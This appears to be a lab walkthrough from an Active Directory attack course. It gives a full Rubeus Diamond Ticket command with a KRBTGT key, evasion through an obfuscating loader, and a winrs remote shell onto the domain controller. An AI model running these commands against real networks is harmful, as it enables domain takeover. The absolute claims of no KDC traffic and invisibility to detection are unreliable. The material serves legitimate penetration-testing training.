# Learning Objective 10 — Diamond Ticket Attack Execution

**Date:** 03 August 2026


---

## Prerequisites

- **Domain Admin privileges** (obtained from previous objectives)
- **KRBTGT AES256 key** (extracted via DCSync/Mimikatz)
- **Loader.exe** & **Rubeus.exe** in C:\AD\Tools\
- **Administrator rights** on current machine

---

## Step 1: Open Administrator Command Prompt

```powershell
cmd (as Administrator)
```

Ensure running with elevated privileges.

---

## Step 2: Execute Diamond Ticket Attack

```powershell
Loader.exe -path Rubeus.exe diamond
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /tgtdeleg
  /enctype:aes 
  /ticketuser:administrator 
  /domain:dollarcorp.moneycorp.local 
  /dc:dcorp-dc.dollarcorp.moneycorp.local 
  /ticketuserid:500 
  /groups:512
  /createnetonly:C:\Windows\System32\cmd.exe 
  /show 
  /ptt
```

**Command Breakdown:**
- `Loader.exe` — Obfuscated delivery for evasion
- `Rubeus.exe diamond` — Create Diamond Ticket (modify TGT)
- `/krbkey` — KRBTGT AES256 key (used to decrypt/encrypt TGT)
- `/tgtdeleg` — Use TGT delegation (requires existing valid TGT)
- `/enctype:aes` — AES256 encryption
- `/ticketuser:administrator` — Impersonate Administrator
- `/domain:dollarcorp.moneycorp.local` — Target domain
- `/dc:dcorp-dc` — Domain controller
- `/ticketuserid:500` — RID of Administrator (500)
- `/groups:512` — Add to Domain Admins group (512)
- `/createnetonly:cmd.exe` — Create new logon session
- `/show` — Display ticket info
- `/ptt` — Pass-the-ticket (load into memory)

---

## Step 3: Verify Diamond Ticket in Memory

New cmd.exe spawned with Diamond Ticket loaded.

Display current security context:
```powershell
set username
```

Shows: `USERNAME=DOLLARCORP\Administrator`

---

## Key Concept: No DC Communication

**Important:** Diamond Ticket attack does NOT send requests to DC:
- **AS-REQ:** Not sent (TGT already valid)
- **TGS-REQ:** Not sent to KDC
- **No KDC traffic:** Completely stealthy

**When tickets are used:**
- Only when accessing **specific service**
- Service validates ticket locally
- Service does **optional PAC validation** (rarely enabled)
- No DC involvement at service access time

---

## Step 4: Access Domain Controller

```powershell
winrs -r:dcorp-dc cmd
```

Opens remote shell on Domain Controller using Diamond Ticket.

Verify access:
```powershell
set username
```

Shows: `USERNAME=DOLLARCORP\Administrator`

Confirms Domain Admin access on DC.

---

## Attack Flow

```
1. Run cmd as Administrator
   ↓
2. Execute Diamond Ticket creation
   - Decrypt existing valid TGT (using /tgtdeleg)
   - Modify to add Administrator + Domain Admins group
   - Re-encrypt with KRBTGT AES key
   ↓
3. Load into memory (/ptt)
   ↓
4. Access DC via winrs
   - Service uses forged ticket
   - No KDC validation needed
   - Access granted
```

---

## Why Diamond Ticket is OPSEC-Safe Here

✅ **TGT already valid** — no suspicious AS-REQ  
✅ **No KDC traffic** — no DC audit logs triggered  
✅ **Modified vs forged** — looks like legitimate TGT  
✅ **Service validation only** — not KDC validation  
✅ **Invisible to MDI** — Microsoft Defender for Identity blind  

---

## Tickets Are Used On-Demand

```
Diamond Ticket created in memory
   ↓
No network traffic to DC yet
   ↓
Execute winrs -r:dcorp-dc cmd
   ↓
Ticket presented to service
   ↓
Service validates (no DC call)
   ↓
Access granted
```

---

## Verification

After accessing DC:

```powershell
# Inside the DC shell, verify admin access
whoami
# Should output: DOLLARCORP\Administrator

# Check local admin group
net localgroup Administrators
# Should include DOLLARCORP\Administrator

# Access restricted resources
dir C:\Windows\System32
# Should work (admin access)
```

---

## Comparison: This vs Previous Objectives

| Technique | DC Communication | Stealth | Access Scope |
|---|---|---|---|
| Golden Ticket | No | Medium | Entire domain |
| Silver Ticket | No | High | Single service |
| Diamond Ticket | No | Very High | Entire domain |
| Rubeus AsKTGT | Yes | Low | Legitimate auth |

Diamond Ticket = **Best of both worlds** (Golden's scope + Silver's stealth)

---

## References

- [Rubeus - Diamond Ticket](https://github.com/GhostPack/Rubeus)
- [Kerberos Attack Vectors](https://posts.specterops.io/kerberos-attack-vectors-ff1a90899106)

---

*Next: Learning Objective 11 — Cross-Forest Attacks*
